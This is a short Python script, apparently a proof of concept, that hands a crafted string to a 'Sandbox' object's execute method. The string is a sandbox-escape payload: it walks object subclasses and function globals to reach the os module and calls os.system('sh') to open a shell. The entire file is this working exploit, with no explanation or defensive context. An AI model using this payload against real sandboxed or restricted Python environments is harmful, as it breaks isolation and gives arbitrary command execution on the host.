
from __future__ import print_function
from sandbox import Sandbox

s=Sandbox()
string ="""
().__class__.__base__.__subclasses__()[59].__init__.func_globals["linecache"].__dict__["sys"].modules['os'].system('sh')

"""
s.execute(string)
